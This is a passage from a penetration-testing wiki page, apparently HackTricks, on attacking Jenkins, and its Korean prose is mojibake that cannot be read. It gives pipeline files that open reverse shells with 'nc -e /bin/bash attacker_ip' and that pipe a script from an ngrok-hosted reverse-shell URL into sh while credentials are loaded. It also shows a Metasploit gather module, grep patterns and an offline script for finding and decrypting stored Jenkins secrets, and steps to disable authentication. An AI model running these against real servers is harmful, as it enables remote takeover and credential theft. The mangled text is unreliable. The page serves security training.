**Built-In ë…¸ë“œë¥¼ ì†ìƒì‹œí‚¤ëŠ” ê²ƒì´ íŠ¹íˆ í¥ë¯¸ë¡­ìŠµë‹ˆë‹¤**. ì™œëƒí•˜ë©´ ì´ ë…¸ë“œëŠ” ë¯¼ê°í•œ Jenkins ì •ë³´ë¥¼ í¬í•¨í•˜ê³  ìˆê¸° ë•Œë¬¸ì…ë‹ˆë‹¤.

**íŒŒì´í”„ë¼ì¸**ì„ **built-in Jenkins ë…¸ë“œ**ì—ì„œ **ì‹¤í–‰**í•˜ê³  ì‹¶ë‹¤ë©´, íŒŒì´í”„ë¼ì¸ ë‚´ë¶€ì— ë‹¤ìŒ ì„¤ì •ì„ ì§€ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
pipeline {
agent {label 'built-in'}
```
### Complete example

íŠ¹ì • ì—ì´ì „íŠ¸ì—ì„œ íŒŒì´í”„ë¼ì¸, cron íŠ¸ë¦¬ê±°, íŒŒì´í”„ë¼ì¸ ë° ìŠ¤í…Œì´ì§€ í™˜ê²½ ë³€ìˆ˜, ë‹¨ê³„ì—ì„œ 2ê°œì˜ ë³€ìˆ˜ë¥¼ ë¡œë“œí•˜ê³  ë¦¬ë²„ìŠ¤ ì‰˜ì„ ë³´ë‚´ëŠ” ì˜ˆì œ:

```markdown
pipeline {
    agent any
    triggers {
        cron('H/5 * * * *')
    }
    environment {
        PIPELINE_ENV = 'pipeline_value'
    }
    stages {
        stage('Example') {
            environment {
                STAGE_ENV = 'stage_value'
            }
            steps {
                script {
                    def stepVar1 = 'value1'
                    def stepVar2 = 'value2'
                    sh 'nc -e /bin/bash attacker_ip 4444'
                }
            }
        }
    }
}
```
```bash
pipeline {
agent {label 'built-in'}
triggers { cron('H */4 * * 1-5') }
environment {
GENERIC_ENV_VAR = "Test pipeline ENV variables."
}

stages {
stage("Build") {
environment {
STAGE_ENV_VAR = "Test stage ENV variables."
}
steps {
withCredentials([usernamePassword(credentialsId: 'amazon', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD'),
string(credentialsId: 'slack-url',variable: 'SLACK_URL'),]) {
sh '''
curl https://reverse-shell.sh/0.tcp.ngrok.io:16287 | sh PASS
'''
}
}
}

post {
always {
cleanWs()
}
}
}
```
## Post Exploitation

### Metasploit
```
msf> post/multi/gather/jenkins_gather
```
### Jenkins Secrets

ë‹¹ì‹ ì´ ì¶©ë¶„í•œ ê¶Œí•œì„ ê°€ì§€ê³  ìˆë‹¤ë©´ `/credentials/`ì— ì ‘ê·¼í•˜ì—¬ ë¹„ë°€ì„ ë‚˜ì—´í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ëŠ” `credentials.xml` íŒŒì¼ ë‚´ë¶€ì˜ ë¹„ë°€ë§Œ ë‚˜ì—´í•  ê²ƒì´ì§€ë§Œ, **ë¹Œë“œ êµ¬ì„± íŒŒì¼**ì—ë„ **ë” ë§ì€ ìê²© ì¦ëª…**ì´ ìˆì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ê° í”„ë¡œì íŠ¸ì˜ **êµ¬ì„±ì„ ë³¼ ìˆ˜ ìˆë‹¤ë©´**, ì €ì¥ì†Œì— ì ‘ê·¼í•˜ê¸° ìœ„í•´ ì‚¬ìš©ë˜ëŠ” **ìê²© ì¦ëª…(ë¹„ë°€)ì˜ ì´ë¦„**ê³¼ **í”„ë¡œì íŠ¸ì˜ ë‹¤ë¥¸ ìê²© ì¦ëª…**ë„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

![](<../../.gitbook/assets/image (180).png>)

#### From Groovy

{% content-ref url="jenkins-dumping-secrets-from-groovy.md" %}
[jenkins-dumping-secrets-from-groovy.md](jenkins-dumping-secrets-from-groovy.md)
{% endcontent-ref %}

#### From disk

ë‹¤ìŒ íŒŒì¼ë“¤ì€ **Jenkins ë¹„ë°€ì„ ë³µí˜¸í™”**í•˜ëŠ” ë° í•„ìš”í•©ë‹ˆë‹¤:

* secrets/master.key
* secrets/hudson.util.Secret

ì´ëŸ¬í•œ **ë¹„ë°€ì€ ë³´í†µ ë‹¤ìŒ ìœ„ì¹˜ì—ì„œ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤**:

* credentials.xml
* jobs/.../build.xml
* jobs/.../config.xml

ë‹¤ìŒì„ ì°¾ê¸° ìœ„í•œ ì •ê·œ í‘œí˜„ì‹ì…ë‹ˆë‹¤:
```bash
# Find the secrets
grep -re "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<"
# Print only the filenames where the secrets are located
grep -lre "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<"

# Secret example
credentials.xml: <secret>{AQAAABAAAAAwsSbQDNcKIRQMjEMYYJeSIxi2d3MHmsfW3d1Y52KMOmZ9tLYyOzTSvNoTXdvHpx/kkEbRZS9OYoqzGsIFXtg7cw==}</secret>
```
#### Decrypt Jenkins secrets offline

ë§Œì•½ **ë¹„ë°€ì„ ë³µí˜¸í™”í•˜ëŠ” ë° í•„ìš”í•œ ë¹„ë°€ë²ˆí˜¸ë¥¼ ë¤í”„í–ˆë‹¤ë©´**, [**ì´ ìŠ¤í¬ë¦½íŠ¸**](https://github.com/gquere/pwn\_jenkins/blob/master/offline\_decryption/jenkins\_offline\_decrypt.py)ë¥¼ ì‚¬ìš©í•˜ì—¬ **ê·¸ ë¹„ë°€ì„ ë³µí˜¸í™”**í•˜ì‹­ì‹œì˜¤.
```bash
python3 jenkins_offline_decrypt.py master.key hudson.util.Secret cred.xml
06165DF2-C047-4402-8CAB-1C8EC526C115
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAt985Hbb8KfIImS6dZlVG6swiotCiIlg/P7aME9PvZNUgg2Iyf2FT
```
#### Groovyì—ì„œ Jenkins secrets ë³µí˜¸í™”
```bash
println(hudson.util.Secret.decrypt("{...}"))
```
### Create new admin user

1. `/var/lib/jenkins/config.xml` ë˜ëŠ” `C:\Program Files (x86)\Jenkis\`ì— ìˆëŠ” Jenkins config.xml íŒŒì¼ì— ì ‘ê·¼í•©ë‹ˆë‹¤.
2. `<useSecurity>true</useSecurity>`ë¥¼ ì°¾ì•„ì„œ **`true`**ë¥¼ **`false`**ë¡œ ë³€ê²½í•©ë‹ˆë‹¤.
   1. `sed -i -e 's/<useSecurity>true</<useSecurity>false</g' config.xml`
3. **Jenkins** ì„œë²„ë¥¼ **ì¬ì‹œì‘**í•©ë‹ˆë‹¤: `service jenkins restart`
4. ì´ì œ ë‹¤ì‹œ Jenkins í¬í„¸ë¡œ ì´ë™í•˜ë©´ ì´ë²ˆì—ëŠ” **Jenkinsê°€ ìê²© ì¦ëª…ì„ ë¬»ì§€ ì•ŠìŠµë‹ˆë‹¤**. "**Manage Jenkins**"ë¡œ ì´ë™í•˜ì—¬ **ê´€ë¦¬ì ë¹„ë°€ë²ˆí˜¸ë¥¼ ë‹¤ì‹œ ì„¤ì •**í•©ë‹ˆë‹¤.
5. `<useSecurity>true</useSecurity>`ë¡œ ì„¤ì •ì„ ë³€ê²½í•˜ì—¬ **ë³´ì•ˆì„ ë‹¤ì‹œ í™œì„±í™”**í•˜ê³  **Jenkinsë¥¼ ë‹¤ì‹œ ì‹œì‘**í•©ë‹ˆë‹¤.

## References

* [https://github.com/gquere/pwn\_jenkins](https://github.com/gquere/pwn\_jenkins)
* [https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/](https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/)
* [https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password](https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password)
* [https://www.lazysystemadmin.com/2018/12/quick-howto-reset-jenkins-admin-password.html](https://www.lazysystemadmin.com/2018/12/quick-howto-reset-jenkins-admin-password.html)
* [https://medium.com/cider-sec/exploiting-jenkins-build-authorization-22bf72926072](https://medium.com/cider-sec/exploiting-jenkins-build-authorization-22bf72926072)
* [https://medium.com/@Proclus/tryhackme-internal-walk-through-90ec901926d3](https://medium.com/@Proclus/tryhackme-internal-walk-through-90ec901926d3)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
